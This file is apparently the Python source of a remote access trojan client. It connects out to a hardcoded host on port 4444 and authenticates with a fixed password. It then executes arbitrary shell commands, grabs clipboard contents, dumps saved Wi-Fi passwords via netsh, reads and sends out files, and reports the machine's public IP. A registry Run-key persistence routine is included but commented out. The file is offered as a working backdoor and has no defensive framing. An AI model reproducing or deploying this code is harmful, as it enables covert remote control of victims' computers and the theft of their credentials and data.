import shutil
import datetime
import pynput
import keyboard
import pyttsx3
import time
import re
import sys
import requests
import os
import socket
import subprocess
import getpass
import json
import time

def imports():
    try:
        import datetime
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install datetime", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import datetime
        import time

    try:
        import pynput
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install pynput", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pynput

    try:
        import keyboard
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install keyboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import keyboard

    try:
        import pyttsx3
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pyttsx3


imports()


time.sleep(.1)

engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('rate', 200)
engine.setProperty('voice', voices[1].id)
engine.runAndWait()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    time.sleep(3)
    try:
        connection.connect(("192.168.1.64", 4444))
        break
    except Exception as e:
        print(e)


oss = sys.platform
passwd = "Testing95"
logsuc = "[+] Login Successful"
logfail = "Incorrect"
something = "something"
cd_check = 0
invalid_dir = "Invalid Directory"
has_ben_defed = 0
###############################


def login():
    while True:
        lr = str(connection.recv(1024), "utf-8")
        if lr == passwd:
            connection.send(str.encode(logsuc))
            connection.send(str.encode(json.dumps(
                [oss, getpass.getuser(), requests.get('https://api.ipify.org/').text])))
            break
        elif lr != passwd:
            connection.send(str.encode(logfail))


def start_up():
    file_location = os.environ["appdata" + "\\WINDOWS'.exe"]
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call(
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)


def run_commands():
    global has_ben_defed
    global connection
    try:
        while True:
            data = connection.recv(1024)
            if 'cd' not in data[:].decode("utf-8").lower():
                cmd = subprocess.Popen(data[:].decode(
                    "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                has_ben_defed = 1
            data_d = data[:].decode("utf-8")
            Directory = re.match("(?:cd) (.*)", data_d)
            ldata = data[:].decode("utf-8").lower().strip()
            print("LDATA: " + ldata)
            if "speak " in ldata:
                ogl = 0
                xy = 8
                xyz = 0
                while xy == 8:
                    try:
                        d_data = data[:].decode("utf-8").lower()
                        d_data = str(d_data)
                        d_data_split = d_data.split()
                        ll = len(d_data_split)
                        ogl += 1
                        pyttsx3.speak(d_data_split[int(ogl)])
                    except IndexError:
                        run_commands()
            elif ldata == "clipboard get":
                print("recived command for clipboard")
                if "win" in oss:
                    clipboard_content = subprocess.check_output(
                        "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    connection.send(str.encode(str(clipboard_content)))
                elif "mac" in oss:
                    clipboard_content = subprocess.check_output(
                        "pbpaste", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    connection.send(str.encode(str(clipboard_content)))
                else:
                    connection.send(str.encode(
                        "Sorry, but this command is only available for windows and mac os"))
            elif ldata == "wifipass" or ldata == "wifi pass":
                pn = 0
                while True:
                    try:
                        show_profile = subprocess.check_output(
                            "netsh wlan show profile", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        regex_name = re.findall(
                            "(?:All User Profile\s*:\s)(.*)", show_profile.decode())
                        tarwifi = regex_name[pn]
                        pn += 1
                        getp = subprocess.check_output(
                            "netsh wlan show profile " + tarwifi + " key=clear", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        wifip = re.search(
                            "(?:Key Content\s*:\s)(.*)", getp.decode())
                        connection.send(str.encode(str(wifip)))
                    except IndexError:
                        connection.send(str.encode(str(something)))
                        break

            elif "pubip" not in ldata and "wifipass" not in ldata:
                if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
                    connection.send(str.encode(
                        str(output_str) + str(os.getcwd()) + '> '))

                elif Directory and ldata != "cd.." and ldata != "cd ..":
                    try:
                        chosen_dir = Directory.group(1)
                        os.chdir(str(chosen_dir))
                        chosen_dir = "Directory has successfully been changed to " + chosen_dir
                        connection.send(str.encode(str(chosen_dir)))
                    except FileNotFoundError:
                        connection.send(str.encode(str(invalid_dir)))

                elif ldata == 'cd' or ldata == 'cd ':
                    my_cwd = os.getcwd()
                    connection.send(str.encode(str(my_cwd)))

                elif ldata == 'cd..' or ldata == 'cd ..':
                    try:
                        os.chdir("..")
                        cd_output = "You have successfully went back one directory"
                        connection.send(str.encode(str(cd_output)))
                    except FileNotFoundError:
                        connection.send(str.encode(str(invalid_dir)))
                else:
                    path = connection.recv(1024)
                    path = str(path.decode())
                    with open(path, "rb") as file:
                        file_content = str(file.read())
                    connection.send(str.encode(str(file_content)))

            elif "pubip" in ldata:
                publicIP = requests.get('https://api.ipify.org/').text
                connection.send(str.encode(publicIP))
    except Exception as e:
        # sys.exit()
        # If we uncomment the line above, you will no longer be able to connect to the client computer after the connection ends (until the file is relaunched)
        print(e)
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            time.sleep(3)
            try:
                connection.connect(("192.168.1.64", 4444))
                break
            except Exception as e:
                print(e)
        login()
        run_commands()


# start_up()
# If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
login()
run_commands()
